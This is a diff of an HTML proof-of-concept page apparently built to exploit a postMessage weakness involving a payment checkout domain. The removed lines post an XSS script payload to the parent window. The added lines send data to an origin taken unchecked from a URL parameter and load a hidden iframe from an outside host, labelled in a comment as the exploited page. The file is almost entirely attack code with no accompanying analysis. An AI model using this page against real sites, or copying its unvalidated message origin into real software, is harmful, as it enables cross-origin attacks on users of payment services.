@@ -2,16 +2,54 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Postmessage PoC</title>
+    <title>Vulnerable Page</title>
     <script>
-        // Function to send a message to the parent window
-        function sendMessageToParent() {
-            let msg = "<script>alert('XSS from secure.checkout.visa.com');</script>";
-            window.parent.postMessage(msg, 'https://secure.checkout.visa.com');
+        function createCookie(name, value, days) {
+            var expires;
+            if (days) {
+                var date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                expires = "; expires=" + date.toGMTString();
+            }
+            else {
+                expires = "";
+            }
+            var isSecure = (window.location.protocol.split(':')[0] === 'https') ? 'secure;' : '' ;
+            document.cookie = name + "=" + value + expires + "; path=/; " + isSecure;
         }
+
+        function getCookie(name) {
+            var results = new RegExp(name + "=([^;]*)").exec(document.cookie);
+            return results ? results[1] : '';
+        }
+
+        function urlParam(name){
+            var results = new RegExp("[\\?&]" + name + "=([^&#]*)").exec(location.search);
+            return results ? decodeURIComponent(results[1].replace(/\+/g, " ")) : '';
+        }
+
+        createCookie('ready', 'ready');
+
+        var data = [],
+            url = urlParam('parentUrl');
+
+        if (getCookie('ready') === 'ready'){
+            data.push('ready');
+        } else {
+            data.push('notReady');
+        }
+
+        data.push('{}');
+        parent.postMessage(data.join('--'), url);
+
+        if (typeof window['console'] !== 'undefined')
+            console.log(data.join('--'));
     </script>
 </head>
 <body>
-    <a href="#" onclick="sendMessageToParent(); return false;">PoC link</a>
+    <!-- Vulnerable page content -->
+    <h1>Vulnerable Page Content</h1>
+    <!-- The iframe to load the exploited page -->
+    <iframe src="https://xsnapfish.com/visa.html" style="display: none;"></iframe>
 </body>
 </html>
